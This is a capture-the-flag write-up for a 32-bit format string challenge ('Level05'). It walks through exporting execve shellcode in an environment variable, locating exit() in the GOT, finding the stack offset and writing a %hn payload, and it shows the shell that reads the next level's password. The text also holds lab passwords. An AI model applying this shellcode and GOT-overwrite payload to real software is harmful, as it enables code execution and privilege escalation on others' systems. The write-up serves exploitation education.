# Level05 - 32 bits - Format string vulnerability

## Local script usage

Requirements:

- `gdb-peda`
- `getenv32`

You can setup requirements with the script: [scripts/installUtils.sh](../../scripts/installUtils.sh)

```shell
./scripts/installUtils.sh
./level05/Ressources/main.sh
```

## Passwords and token

|         |                                            |
| ------- | ------------------------------------------ |
| level05 | `3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN` |
| level06 | `h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq` |

## Steps to resolve on VM

See our assembly interpretation in [source file](../source.c)

We notice a vulnerable printf and then an exit syscall.

We could replace the exit address in the Global Offset Table, with the address of a shellcode exported as environment variable.

Basically, when the program is executed, the GOT (Global Offset Table) is initialized for every external functions (like libc functions). By doing so, the executable will cache the memory address in the GOT, so that it doesn't have to ask libc each time an external function is called.

The goal here will be to overwrite the address of exit() in the GOT with the address of hello(). There are 4 steps here :

- Find the address of the shellcode
- Find the address of exit() in GOT
- Find the offset of our buffer on the stack
- Write the proper exploit string

Let's find the shellcode address

```shell
export SHELLCODE=`python -c "print '\x90' * 0xff + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'"`

/tmp/getenv32 SHELLCODE ~/level05
  0xffffd74a

p 0xffffd74a + 100 # target in the middle of nopsled
  $7 = 0xffffd7ae
```

Now lets find the exit address in GOT

```shell
objdump -R ~/level05 | grep exit
  080497e0 R_386_JUMP_SLOT   exit
```

And now the buffer offset in the stack

```shell
b*main+195
run <<< "AAAAAA"
telescope 20
[------------------------------------stack-------------------------------------]
0000| 0xffffd590 --> 0xffffd5b8 ("aaaaaa\n")        # _
0004| 0xffffd594 --> 0x64 ('d')                     #  |
0008| 0xffffd598 --> 0xf7fcfac0 --> 0xfbad2288      #  |
0012| 0xffffd59c --> 0xf7ec3af9 (test   eax,eax)    #  |
0016| 0xffffd5a0 --> 0xffffd5df --> 0x48520f7       #  |
0020| 0xffffd5a4 --> 0xffffd5de --> 0x8520f7fc      #  |
0024| 0xffffd5a8 --> 0x0                            #  |
0028| 0xffffd5ac --> 0xffffffff                     #  |
0032| 0xffffd5b0 --> 0xffffd664 --> 0x86d22783      #  |
0036| 0xffffd5b4 --> 0x0                            #  |
0040| 0xffffd5b8 ("aaaaaa\n")                       # _| offset 10
0044| 0xffffd5bc --> 0xa6161 ('aa\n')
[------------------------------------------------------------------------------]

# The offset is 10. Lets check that
~/level05
(stdin) AAAA%10$p
  aaaa0x61616161
```

We have now everything we need.

We want write `0xffffd7ae` at `0x080497e0`

As `0xffffd7ae` is a big value, instead of print this value, we will split this integer with two short integers:

- High-order bytes: 0xffff will be written at `0x080497e0 + 2`
- Low-order bytes: 0xd7ae will be written at `0x080497e0`

Basically, our format string should be something like:

```bash
ADDRESS_1 + ADDRESS_2 + %<VALUE_1>x + %10$hn +  %<VALUE_2>x + %11$hn
   _____________________________________|                      |
   |           ________________________________________________|
   |           |
ADDRESS_1 + ADDRESS_2 + %<VALUE_1>x + %10$hn +  %<VALUE_2>x + %11$hn
   |           |            |                       |
0x080497e0 0x080497e2  (0xd7ae - 8)         (0xffff - 0xd7ae)

=> "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55206x" + "%10$hn" + "%10321x" + "%11$hn"
```

> \_Note: VALUE_1 has to be greater than VALUE_2. Otherwise, switch addresses

Lets try

```shell
python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55206x" + "%10$hn" + "%10321x" + "%11$hn"' > /tmp/exploit05

cat /tmp/exploit05 - | ~/level05
(...)
$ whoami
  level06
$ cat /home/users/level06/.pass
  h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```

## Sources

### Hack

- [Exploit 101 - Format Strings](https://axcheron.github.io/exploit-101-format-strings/)

### C

- [Man exit](https://linux.die.net/man/3/exit)
- [Man fgets](https://linux.die.net/man/3/fgets)
- [Man printf](https://linux.die.net/man/3/printf)
